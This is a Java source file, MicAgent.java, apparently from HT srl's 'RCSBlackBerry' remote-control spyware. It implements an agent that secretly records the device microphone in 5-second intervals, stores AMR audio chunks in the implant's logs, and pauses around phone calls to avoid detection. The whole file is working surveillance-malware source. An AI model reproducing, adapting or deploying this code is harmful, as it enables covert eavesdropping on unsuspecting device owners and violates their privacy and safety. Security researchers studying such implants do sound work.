//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : MicAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.blackberry.api.phone.PhoneListener;
import net.rim.device.api.util.DataBuffer;
import blackberry.AgentManager;
import blackberry.AppListener;
import blackberry.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.fs.AutoFlashFile;
import blackberry.fs.Path;
import blackberry.interfaces.PhoneCallObserver;
import blackberry.log.Log;
import blackberry.log.LogType;
import blackberry.record.AudioRecorder;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class MicAgent.
 */
public final class MicAgent extends Agent implements PhoneListener {
	private static final long MIC_PERIOD = 5000;

	private final int STOPPED = 0;
	private final int STARTED = 1;
	private final int SUSPENDED = 2;

	static final int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5,
			5, 0, 0, 0, 0 };

	public static final int COLOR_LIGHT_BLUE = 0x00C8F0FF;

	//#ifdef DEBUG
	static Debug debug = new Debug("MicAgent", DebugLevel.VERBOSE);
	//#endif

	//#ifdef SAVE_AMR_FILE
	AutoFlashFile amrfile;
	//#endif

	//AudioRecorderDispatcher recorder;
	long fId;

	//boolean suspended = false;
	int state;
	Object stateLock = new Object();

	private AudioRecorder recorder;
	int numFailures;

	/**
	 * Instantiates a new mic agent.
	 * 
	 * @param agentStatus
	 *            the agent status
	 */
	public MicAgent(final boolean agentStatus) {
		super(Agent.AGENT_MIC, agentStatus, Conf.AGENT_MIC_ON_SD, "MicAgent");
		//#ifdef DBC
		Check.asserts(Log.convertTypeLog(agentId) == LogType.MIC,
				"Wrong Conversion");
		//#endif
	}

	/**
	 * Instantiates a new mic agent.
	 * 
	 * @param agentStatus
	 *            the agent status
	 * @param confParams
	 *            the conf params
	 */
	protected MicAgent(final boolean agentStatus, final byte[] confParams) {
		this(agentStatus);
		parse(confParams);
		state = STOPPED;
	}

	private void newState(int newstate) {
		synchronized (stateLock) {
			state = newstate;
		}
	}

	public synchronized void actualStart() {
		//#ifdef DEBUG_INFO
		debug.info("start");
		//#endif

		synchronized (stateLock) {
			if (state != STARTED) {
				Phone.addPhoneListener(this);

				//#ifdef DBC
				Check.ensures(state != STARTED, "state == STARTED");
				//#endif			
				startRecorder();

				//#ifdef DEBUG_TRACE
				debug.trace("started");
				//#endif

			}

			state = STARTED;
		}

	}

	public synchronized void actualStop() {
		//#ifdef DEBUG_INFO
		debug.info("stop");
		//#endif

		synchronized (stateLock) {
			if (state == STARTED) {
				Phone.removePhoneListener(this);

				//#ifdef DBC
				Check.ensures(state != STOPPED, "state == STOPPED");
				//#endif
				saveRecorderLog();
				stopRecorder();
			}
			state = STOPPED;

		}
		//#ifdef DEBUG_TRACE
		debug.trace("stopped");
		//#endif

	}

	synchronized void startRecorder() {
		//#ifdef DEBUG_TRACE
		debug.trace("startRecorder");
		//#endif

		DateTime dateTime = new DateTime();
		fId = dateTime.getFiledate();

		//#ifdef SAVE_AMR_FILE
		String filename = Path.SD() + "filetest." + dateTime.getOrderedString()
				+ ".amr";
		debug.trace("Creating file: " + filename);
		amrfile = new AutoFlashFile(filename, false);
		boolean ret = amrfile.create();
		//ret &= amrfile.write(AudioRecorder.AMR_HEADER);

		Check.asserts(ret, "actualStart: cannot write file: " + filename);
		//#endif

		recorder = new AudioRecorder();
		recorder.start();

		//#ifdef DEBUG_TRACE
		debug.trace("Started: " + (recorder != null));
		//#endif

		//#ifdef DEBUG
		debug.ledStart(COLOR_LIGHT_BLUE);
		//#endif

		numFailures = 0;
	}

	synchronized void stopRecorder() {
		//#ifdef DEBUG_TRACE
		debug.trace("stopRecorder");
		//#endif

		if (recorder == null) {
			//#ifdef DEBUG_ERROR
			debug.error("Null recorder");
			//#endif
			return;
		}

		//#ifdef DEBUG_INFO
		debug.info("STOP");
		//#endif

		recorder.stop();
		//#ifdef DEBUG
		debug.ledStop();
		//#endif
	}

	/*
	 * (non-Javadoc)
	 * @see blackberry.threadpool.TimerJob#actualRun()
	 */
	public synchronized void actualRun() {
		//#ifdef DBC
		Check.requires(recorder != null, "actualRun: recorder == null");
		//#endif

		synchronized (stateLock) {
			if (state == STARTED) {
				PhoneCall phoneCall = Phone.getActiveCall();
				if (phoneCall != null
						&& phoneCall.getStatus() != PhoneCall.STATUS_DISCONNECTED) {
					//#ifdef DEBUG_WARN
					debug.warn("phone call in progress, suspend!");
					//#endif                   
					suspend();
				} else {

					if (numFailures < 10) {
						saveRecorderLog();
					} else {
						//#ifdef DEBUG_WARN
						debug.warn("numFailures: " + numFailures);
						//#endif

						suspend();
					}
				}
			}
		}
	}

	private synchronized void saveRecorderLog() {
		//#ifdef DBC
		Check.requires(recorder != null, "saveRecorderLog recorder==null");
		//#endif

		byte[] chunk = recorder.getAvailable();

		if (chunk != null && chunk.length > 0) {

			//#ifdef DBC
			Check.requires(log != null, "Null log");
			//#endif

			log.createLog(getAdditionalData());
			int offset = 0;
			if (Utils.equals(chunk, 0, AudioRecorder.AMR_HEADER, 0,
					AudioRecorder.AMR_HEADER.length)) {
				offset = AudioRecorder.AMR_HEADER.length;
			}

			//#ifdef DEBUG_TRACE
			if (offset != 0) {
				debug.trace("offset: " + offset);
			} else {
			}

			//#endif

			log.writeLog(chunk, offset);
			log.close();

			//#ifdef SAVE_AMR_FILE    
			boolean ret = amrfile.append(chunk);
			Check.asserts(ret, "cannot write file!");
			//#endif
		} else {
			//#ifdef DEBUG_WARN
			debug.warn("zero chunk: " + chunk);
			//#endif
			numFailures += 1;
		}

	}

	private byte[] getAdditionalData() {
		final int LOG_MIC_VERSION = 2008121901;
		// LOG_AUDIO_CODEC_SPEEX   0x00;
		final int LOG_AUDIO_CODEC_AMR = 0x01;
		final int sampleRate = 8000;

		int tlen = 16;
		final byte[] additionalData = new byte[tlen];

		final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen,
				false);

		databuffer.writeInt(LOG_MIC_VERSION);
		databuffer.writeInt(sampleRate | LOG_AUDIO_CODEC_AMR);
		databuffer.writeLong(fId);

		//#ifdef DBC
		Check.ensures(additionalData.length == tlen,
				"Wrong additional data name");
		//#endif
		return additionalData;
	}

	/**
	 * Suspend recording
	 */
	private void suspend() {
		synchronized (stateLock) {
			if (state == STARTED) {
				//#ifdef DEBUG_INFO
				debug.info("Call: suspending recording");
				//#endif
				stopRecorder();
				state = SUSPENDED;
			} else {
				//#ifdef DEBUG_TRACE
				debug.trace("suspend: already done");
				//#endif
			}
		}
	}

	private void resume() {
		synchronized (stateLock) {
			if (state == SUSPENDED) {
				//#ifdef DEBUG_INFO
				debug.info("Call: resuming recording");
				//#endif
				startRecorder();
				state = STARTED;
			} else {
				//#ifdef DEBUG_TRACE
				debug.trace("resume: already done");
				//#endif
			}

		}
	}

	/*
	 * (non-Javadoc)
	 * @see blackberry.agent.Agent#parse(byte[])
	 */
	protected boolean parse(final byte[] confParameters) {
		setPeriod(MIC_PERIOD);
		setDelay(MIC_PERIOD);
		return true;
	}

	public void callIncoming(int callId) {
		//#ifdef DEBUG_TRACE
		debug.trace("callIncoming");
		//#endif

		MicAgent agent = (MicAgent) AgentManager.getInstance().getItem(
				AGENT_MIC);
		agent.suspend();
	}

	public void callInitiated(int callid) {
		//#ifdef DEBUG_TRACE
		debug.trace("callInitiated");
		//#endif
		MicAgent agent = (MicAgent) AgentManager.getInstance().getItem(
				AGENT_MIC);
		agent.suspend();
	}

	public void callDisconnected(int callId) {
		//#ifdef DEBUG_TRACE
		debug.trace("callDisconnected");
		//#endif
		MicAgent agent = (MicAgent) AgentManager.getInstance().getItem(
				AGENT_MIC);
		agent.resume();
	}

	public void callAdded(int callId) {
		// TODO Auto-generated method stub

	}

	public void callAnswered(int callId) {
		// TODO Auto-generated method stub

	}

	public void callConferenceCallEstablished(int callId) {
		// TODO Auto-generated method stub

	}

	public void callConnected(int callId) {
		// TODO Auto-generated method stub

	}

	public void callDirectConnectConnected(int callId) {
		// TODO Auto-generated method stub

	}

	public void callDirectConnectDisconnected(int callId) {
		// TODO Auto-generated method stub

	}

	public void callEndedByUser(int callId) {
		// TODO Auto-generated method stub

	}

	public void callFailed(int callId, int reason) {
		// TODO Auto-generated method stub

	}

	public void callHeld(int callId) {
		// TODO Auto-generated method stub

	}

	public void callRemoved(int callId) {
		// TODO Auto-generated method stub

	}

	public void callResumed(int callId) {
		// TODO Auto-generated method stub

	}

	public void callWaiting(int callid) {
		// TODO Auto-generated method stub

	}

	public void conferenceCallDisconnected(int callId) {
		// TODO Auto-generated method stub

	}
}
